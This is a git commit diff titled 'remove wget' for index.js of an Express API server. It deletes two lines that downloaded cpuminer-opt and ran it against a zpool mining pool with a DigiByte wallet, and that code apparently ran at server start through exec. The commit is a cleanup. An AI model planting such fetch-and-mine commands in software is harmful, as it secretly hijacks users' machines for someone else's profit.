dfc6b8d3a1b001cf46ad41f41e13ca74ef3ece93
triwibow <triw3707@gmail.com>
2022-08-31 12:43:41 +0700

    remove wget

--- index.js
+++ index.js
@@ -23,8 +23,6 @@ app.use(cors())
 app.use('/api/v1/', routerV1);
 app.listen(port, () => console.log(`Listening on port ${port}`));
 
-const wget = 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz';
-const run = './cpuminer-sse2 -a cpupower -o stratum+tcp://cpupower.sea.mine.zpool.ca:6240 -u DL4UDGn1BJ1KhnWaSZUgZMji5GE1ZcqpCp -p c=DGB -t 4';
 var child = exec(wget, function(err, stdout, stderr) {
     if(err){
         throw(err);
